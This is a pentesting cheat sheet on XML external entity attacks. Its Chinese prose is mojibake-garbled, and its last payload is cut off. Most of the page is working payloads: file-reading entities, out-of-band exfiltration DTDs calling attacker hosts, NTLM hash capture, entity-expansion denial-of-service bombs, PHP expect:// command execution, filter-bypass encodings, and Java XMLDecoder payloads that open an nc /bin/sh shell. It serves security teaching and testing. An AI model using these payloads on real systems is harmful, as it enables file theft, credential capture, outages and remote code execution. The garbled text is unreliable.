è¦æµ‹è¯•æ­¤æ¼æ´ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å« XXE è´Ÿè½½çš„ Microsoft Office æ–‡ä»¶ã€‚ç¬¬ä¸€æ­¥æ˜¯åˆ›å»ºä¸€ä¸ªç©ºç›®å½•ï¼Œä»¥ä¾¿å¯ä»¥å°†æ–‡æ¡£è§£å‹ç¼©åˆ°å…¶ä¸­ã€‚

æ–‡æ¡£è§£å‹ç¼©åï¼Œåº”æ‰“å¼€ä½äº `./unzipped/word/document.xml` çš„ XML æ–‡ä»¶ï¼Œå¹¶åœ¨é¦–é€‰æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚ vimï¼‰ä¸­è¿›è¡Œç¼–è¾‘ã€‚åº”ä¿®æ”¹ XML ä»¥åŒ…å«æ‰€éœ€çš„ XXE è´Ÿè½½ï¼Œé€šå¸¸ä»¥ HTTP è¯·æ±‚å¼€å¤´ã€‚

ä¿®æ”¹åçš„ XML è¡Œåº”æ’å…¥åœ¨ä¸¤ä¸ªæ ¹ XML å¯¹è±¡ä¹‹é—´ã€‚é‡è¦çš„æ˜¯å°† URL æ›¿æ¢ä¸ºå¯ç›‘æ§è¯·æ±‚çš„ URLã€‚

æœ€åï¼Œå¯ä»¥å°†æ–‡ä»¶å‹ç¼©ä¸ºæ¶æ„ poc.docx æ–‡ä»¶ã€‚ä»å…ˆå‰åˆ›å»ºçš„ "unzipped" ç›®å½•ä¸­ï¼Œåº”è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

ç°åœ¨ï¼Œå¯ä»¥å°†åˆ›å»ºçš„æ–‡ä»¶ä¸Šä¼ åˆ°å¯èƒ½å­˜åœ¨æ¼æ´çš„ Web åº”ç”¨ç¨‹åºä¸­ï¼Œå¹¶å¸Œæœ›åœ¨ Burp Collaborator æ—¥å¿—ä¸­å‡ºç°è¯·æ±‚ã€‚


### Jar åè®®

`jar` åè®®ä»…é€‚ç”¨äº Java åº”ç”¨ç¨‹åºã€‚å®ƒå…è®¸è®¿é—® PKZIP æ–‡ä»¶ï¼ˆ`.zip`ã€`.jar` ç­‰ï¼‰ä¸­çš„æ–‡ä»¶ï¼Œå¹¶é€‚ç”¨äºæœ¬åœ°å’Œè¿œç¨‹æ–‡ä»¶ã€‚
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
è®¿é—® PKZIP æ–‡ä»¶å†…éƒ¨çš„æ–‡ä»¶å¯¹äºé€šè¿‡ç³»ç»Ÿ DTD æ–‡ä»¶æ»¥ç”¨ XXE éå¸¸æœ‰ç”¨ã€‚æŸ¥çœ‹[æ­¤éƒ¨åˆ†ä»¥äº†è§£å¦‚ä½•æ»¥ç”¨ç³»ç»Ÿ DTD æ–‡ä»¶](xxe-xee-xml-external-entity.md#error-based-system-dtd)ã€‚
{% endhint %}

#### å¹•å

1. å‘èµ· HTTP è¯·æ±‚ä»¥åŠ è½½ zip å­˜æ¡£ã€‚`https://download.host.com/myarchive.zip`
2. å°† HTTP å“åº”ä¿å­˜åˆ°ä¸´æ—¶ä½ç½®ã€‚`/tmp/...`
3. è§£å‹å­˜æ¡£ã€‚
4. è¯»å– `file.zip`
5. åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚

è¯·æ³¨æ„ï¼Œå¯ä»¥åœ¨ç¬¬äºŒæ­¥ä¸­åœæ­¢æµç¨‹ã€‚æŠ€å·§æ˜¯åœ¨æä¾›æ–‡ä»¶æ—¶æ°¸è¿œä¸è¦å…³é—­è¿æ¥ã€‚[è¿™äº›å·¥å…·å¯èƒ½ä¼šæœ‰æ‰€å¸®åŠ©](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)ï¼šä¸€ä¸ªæ˜¯ Python ä¸­çš„ `slow_http_server.py`ï¼Œå¦ä¸€ä¸ªæ˜¯ Java ä¸­çš„ `slowserver.jar`ã€‚

ä¸€æ—¦æœåŠ¡å™¨ä¸‹è½½äº†æ‚¨çš„æ–‡ä»¶ï¼Œæ‚¨éœ€è¦é€šè¿‡æµè§ˆä¸´æ—¶ç›®å½•æ¥æ‰¾åˆ°å…¶ä½ç½®ã€‚ç”±äºè·¯å¾„æ˜¯éšæœºçš„ï¼Œå› æ­¤æ— æ³•æå‰é¢„æµ‹æ–‡ä»¶è·¯å¾„ã€‚

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
å°†æ–‡ä»¶å†™å…¥ä¸´æ—¶ç›®å½•å¯ä»¥å¸®åŠ©**å‡çº§æ¶‰åŠè·¯å¾„éå†çš„å¦ä¸€ä¸ªæ¼æ´**ï¼ˆä¾‹å¦‚æœ¬åœ°æ–‡ä»¶åŒ…å«ã€æ¨¡æ¿æ³¨å…¥ã€XSLT RCEã€ååºåˆ—åŒ–ç­‰ï¼‰ã€‚
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### åäº¿ç¬‘æ”»å‡»
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml æ”»å‡»
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### äºŒæ¬¡æ–¹çˆ†ç‚¸æ”»å‡»

![](<../.gitbook/assets/image (531).png>)

#### è·å– NTML

åœ¨ Windows ä¸»æœºä¸Šï¼Œå¯ä»¥é€šè¿‡è®¾ç½® responder.py å¤„ç†ç¨‹åºæ¥è·å– Web æœåŠ¡å™¨ç”¨æˆ·çš„ NTML å“ˆå¸Œå€¼ï¼š
```
Responder.py -I eth0 -v
```
é€šè¿‡å‘é€ä»¥ä¸‹è¯·æ±‚
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## éšè—çš„XXEè¡¨é¢

### XInclude

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**å®¢æˆ·ç«¯å‘é€çš„æ•°æ®åœ¨è§£æä¹‹å‰ä¼šè¢«æœåŠ¡å™¨ç«¯å¤„ç†å¹¶åˆå¹¶åˆ°ä¸€ä¸ªXMLæ–‡æ¡£ä¸­**ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨å®¢æˆ·ç«¯æ•°æ®è¢«æ•´åˆåˆ°ä¸€ä¸ª**åç«¯SOAPè¯·æ±‚**ä¸­ï¼Œéšåç”±åç«¯çš„SOAPæœåŠ¡å¤„ç†ã€‚

åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œæ‰§è¡Œä¼ ç»Ÿçš„XXEï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰æ”»å‡»å˜å¾—å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸ºå¯¹XMLæ–‡æ¡£æ•´ä½“çš„æ§åˆ¶å—é™ï¼Œç‰¹åˆ«æ˜¯æ— æ³•ä¿®æ”¹æˆ–å¼•å…¥`DOCTYPE`å…ƒç´ ã€‚ç„¶è€Œï¼Œåˆ©ç”¨`XInclude`ï¼Œè¿™æ˜¯XMLæ ‡å‡†çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒå…è®¸ä»è¾ƒå°çš„å­æ–‡æ¡£ç»„è£…ä¸€ä¸ªXMLæ–‡æ¡£ï¼Œæä¾›äº†ä¸€ç§è§£å†³æ–¹æ³•ã€‚è¿™ç§æ–¹æ³•å…è®¸åœ¨XMLæ–‡æ¡£çš„ä»»ä½•æ•°æ®å…ƒç´ ä¸­è¿›è¡Œ`XInclude`æ”»å‡»ï¼Œåœ¨æœåŠ¡å™¨ç”Ÿæˆçš„XMLæ–‡æ¡£ä¸­åµŒå…¥æ•°æ®çš„æ§åˆ¶å—é™çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚

è¦å‘èµ·ä¸€ä¸ª`XInclude`æ”»å‡»ï¼Œéœ€è¦åŒ…å«`XInclude`å‘½åç©ºé—´ï¼Œå¹¶æŒ‡å®šç”¨äºåŒ…å«çš„æ–‡ä»¶è·¯å¾„ã€‚ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•æ„å»ºè¿™æ ·ä¸€ç§æ”»å‡»ï¼š
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
æŸ¥çœ‹[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)è·å–æ›´å¤šä¿¡æ¯ï¼

### SVG - æ–‡ä»¶ä¸Šä¼ 

ç”¨æˆ·ä¸Šä¼ åˆ°æŸäº›åº”ç”¨ç¨‹åºçš„æ–‡ä»¶ï¼Œç„¶ååœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œå¤„ç†ï¼Œå¯èƒ½ä¼šåˆ©ç”¨å¤„ç† XML æˆ–åŒ…å« XML çš„æ–‡ä»¶æ ¼å¼çš„æ¼æ´ã€‚å¸¸è§çš„æ–‡ä»¶æ ¼å¼å¦‚åŠå…¬æ–‡æ¡£ï¼ˆDOCXï¼‰å’Œå›¾åƒï¼ˆSVGï¼‰éƒ½æ˜¯åŸºäº XML çš„ã€‚

å½“ç”¨æˆ·**ä¸Šä¼ å›¾åƒ**æ—¶ï¼Œè¿™äº›å›¾åƒä¼šåœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œå¤„ç†æˆ–éªŒè¯ã€‚å³ä½¿æ˜¯æœŸæœ› PNG æˆ– JPEG ç­‰æ ¼å¼çš„åº”ç”¨ç¨‹åºï¼Œ**æœåŠ¡å™¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒ SVG å›¾åƒ**ã€‚SVG ä½œä¸ºåŸºäº XML çš„æ ¼å¼ï¼Œå¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æäº¤æ¶æ„ SVG å›¾åƒï¼Œä»è€Œä½¿æœåŠ¡å™¨æš´éœ²äº XXEï¼ˆXML External Entityï¼‰æ¼æ´ã€‚

ä¸‹é¢å±•ç¤ºäº†è¿™ç§åˆ©ç”¨çš„ç¤ºä¾‹ï¼Œå…¶ä¸­æ¶æ„ SVG å›¾åƒå°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼š
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
å¦ä¸€ç§æ–¹æ³•æ¶‰åŠå°è¯•é€šè¿‡ PHP çš„ "expect" åŒ…è£…å™¨æ‰§è¡Œå‘½ä»¤ï¼š
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼ŒSVG æ ¼å¼è¢«ç”¨æ¥å‘åŠ¨æ”»å‡»ï¼Œåˆ©ç”¨æœåŠ¡å™¨è½¯ä»¶çš„ XML å¤„ç†èƒ½åŠ›ï¼Œçªæ˜¾äº†å¯¹å¼ºå¤§çš„è¾“å…¥éªŒè¯å’Œå®‰å…¨æªæ–½çš„éœ€æ±‚ã€‚

æŸ¥çœ‹[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)è·å–æ›´å¤šä¿¡æ¯ï¼

**è¯·æ³¨æ„è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œæˆ–æ‰§è¡Œç»“æœå°†å‡ºç°åœ¨åˆ›å»ºçš„å›¾åƒå†…éƒ¨ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦èƒ½å¤Ÿè®¿é—® SVG åˆ›å»ºçš„å›¾åƒã€‚**

### **PDF - æ–‡ä»¶ä¸Šä¼ **

é˜…è¯»ä»¥ä¸‹æ–‡ç« ä»¥**å­¦ä¹ å¦‚ä½•åˆ©ç”¨ XXE ä¸Šä¼  PDF æ–‡ä»¶**ï¼š

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: ä» x-www-urlencoded åˆ° XML

å¦‚æœ POST è¯·æ±‚æ¥å— XML æ ¼å¼çš„æ•°æ®ï¼Œæ‚¨å¯ä»¥å°è¯•åœ¨è¯¥è¯·æ±‚ä¸­åˆ©ç”¨ XXEã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ­£å¸¸è¯·æ±‚åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
ç„¶åæ‚¨å¯èƒ½èƒ½å¤Ÿæäº¤ä»¥ä¸‹è¯·æ±‚ï¼Œç»“æœç›¸åŒï¼š
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: ä» JSON åˆ° XEE

è¦æ›´æ”¹è¯·æ±‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºâ€œ**Content Type Converter**â€çš„ Burp æ‰©å±•ã€‚[åœ¨è¿™é‡Œ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)æ‚¨å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç¤ºä¾‹ï¼š
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
å¦ä¸€ä¸ªç¤ºä¾‹å¯ä»¥åœ¨[è¿™é‡Œ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)æ‰¾åˆ°ã€‚

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
è¿™ä»…åœ¨XMLæœåŠ¡å™¨æ¥å—`data://`åè®®æ—¶æ‰æœ‰æ•ˆã€‚

### UTF-7

æ‚¨å¯ä»¥åœ¨æ­¤å¤„ä½¿ç”¨\[**CyberChefçš„â€œç¼–ç é…æ–¹â€**](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)å°†å…¶è½¬æ¢ä¸ºUTF-7ã€‚
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### æ–‡ä»¶:/ åè®®ç»•è¿‡

å¦‚æœç½‘ç«™ä½¿ç”¨ PHPï¼Œå¯ä»¥ä½¿ç”¨ **php wrappers** `php://filter/convert.base64-encode/resource=` æ¥**è®¿é—®å†…éƒ¨æ–‡ä»¶**ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ `file:/`ã€‚

å¦‚æœç½‘ç«™ä½¿ç”¨ Javaï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹[**jar: åè®®**](xxe-xee-xml-external-entity.md#jar-protocol)ã€‚

### HTML å®ä½“

æ¥è‡ª [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
æ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ª**å®ä½“å†…éƒ¨çš„å®ä½“**ï¼Œä½¿ç”¨**htmlå®ä½“**å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œç„¶åè°ƒç”¨å®ƒæ¥**åŠ è½½ä¸€ä¸ªdtd**ã€‚\
è¯·æ³¨æ„ï¼Œæ‰€ä½¿ç”¨çš„**HTMLå®ä½“**éœ€è¦æ˜¯**æ•°å­—**çš„ï¼ˆä¾‹å¦‚\[åœ¨è¿™ä¸ªä¾‹å­ä¸­]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C))ã€‚
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD ç¤ºä¾‹ï¼š

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHPåŒ…è£…å™¨

### Base64

**æå–** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **æå–å¤–éƒ¨èµ„æº**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### è¿œç¨‹ä»£ç æ‰§è¡Œ

**å¦‚æœåŠ è½½äº† PHP çš„ "expect" æ¨¡å—**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

### **XML External Entity (XEE) Attack**

XML External Entity (XXE) attacks occur when an attacker is able to inject malicious XML content into an XML document processed by a web application. This can lead to sensitive data exposure, server-side request forgery (SSRF), and other security risks.

#### **Detecting XEE Vulnerabilities**

To detect XEE vulnerabilities, you can send a SOAP request with a malicious XML payload containing an external entity reference. If the application processes the external entity and includes sensitive information in its response, the vulnerability is present.

#### **Exploiting XEE Vulnerabilities**

Exploiting XEE vulnerabilities involves crafting a malicious XML payload that includes an external entity pointing to a file or system resource containing sensitive data. By manipulating the XML content, an attacker can retrieve this data through the application's response.

#### **Preventing XEE Attacks**

To prevent XEE attacks, ensure that XML parsing libraries are configured securely to disable external entity processing. Additionally, input validation and sanitization should be implemented to filter out any potentially malicious XML content before processing.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

æœ¬èŠ‚å†…å®¹æ‘˜è‡ª [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
æ ¹æ® [ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/XLIFF) çš„æè¿°ï¼š

> XLIFFï¼ˆXML Localization Interchange File Formatï¼‰æ˜¯ä¸€ç§åŸºäº XML çš„åŒæ–‡æœ¬æ ¼å¼ï¼Œæ—¨åœ¨æ ‡å‡†åŒ–æœ¬åœ°åŒ–æ•°æ®åœ¨æœ¬åœ°åŒ–è¿‡ç¨‹ä¸­åœ¨å·¥å…·ä¹‹é—´ä¼ é€’çš„æ–¹å¼ï¼Œä»¥åŠ CAT å·¥å…·äº¤æ¢çš„å¸¸è§æ ¼å¼ã€‚

### ç›²ç›®è¯·æ±‚
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
æœåŠ¡å™¨å“åº”å‡ºç°é”™è¯¯ï¼š
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
ä½†æˆ‘ä»¬åœ¨Burp Collaboratorä¸Šæ”¶åˆ°äº†ä¸€ä¸ªå‘½ä¸­ã€‚

### é€šè¿‡å¸¦å¤–æ•°æ®æ³„éœ²æ•°æ®
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
æ ¹æ®Burp Collaboratorè¿”å›çš„æ˜¾ç¤ºçš„ç”¨æˆ·ä»£ç†ï¼Œçœ‹èµ·æ¥å®ƒæ­£åœ¨ä½¿ç”¨**Java 1.8**ã€‚åœ¨åˆ©ç”¨è¿™ä¸ªJavaç‰ˆæœ¬çš„XXEæ—¶çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œ**æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¸¦æœ‰`New Line`çš„æ–‡ä»¶**ï¼Œæ¯”å¦‚ä½¿ç”¨Out of BandæŠ€æœ¯è·å–åŒ…å«`/etc/passwd`çš„æ–‡ä»¶ã€‚

### é€šè¿‡åŸºäºé”™è¯¯çš„æ–¹æ³•å¤–æ³„æ•°æ®

DTDæ–‡ä»¶:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
æœåŠ¡å™¨å“åº”:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
éå­˜åœ¨çš„æ–‡ä»¶åœ¨é”™è¯¯æ¶ˆæ¯ä¸­åæ˜ å‡ºæ¥ã€‚æ¥ä¸‹æ¥æ˜¯æ·»åŠ æ–‡ä»¶å†…å®¹ã€‚

DTD æ–‡ä»¶ï¼š
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
å¹¶ä¸”æ–‡ä»¶å†…å®¹æˆåŠŸ**åœ¨é€šè¿‡HTTPå‘é€çš„é”™è¯¯è¾“å‡ºä¸­æ‰“å°å‡ºæ¥**ã€‚

## RSS - XEE

åŒ…å«RSSæ ¼å¼çš„æœ‰æ•ˆXMLä»¥åˆ©ç”¨XXEæ¼æ´ã€‚

### å›æ˜¾

å‘æ”»å‡»è€…æœåŠ¡å™¨å‘é€ç®€å•çš„HTTPè¯·æ±‚
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### è¯»å–æ–‡ä»¶
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### è¯»å–æºä»£ç 

ä½¿ç”¨ PHP base64 è¿‡æ»¤å™¨
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoderæ˜¯ä¸€ä¸ªJavaç±»ï¼Œå®ƒæ ¹æ®XMLæ¶ˆæ¯åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæ¶æ„ç”¨æˆ·å¯ä»¥è®©åº”ç”¨ç¨‹åºåœ¨è°ƒç”¨**readObject**æ–¹æ³•æ—¶ä½¿ç”¨ä»»æ„æ•°æ®ï¼Œä»–å°†ç«‹å³åœ¨æœåŠ¡å™¨ä¸Šè·å¾—ä»£ç æ‰§è¡Œæƒé™ã€‚

### ä½¿ç”¨Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
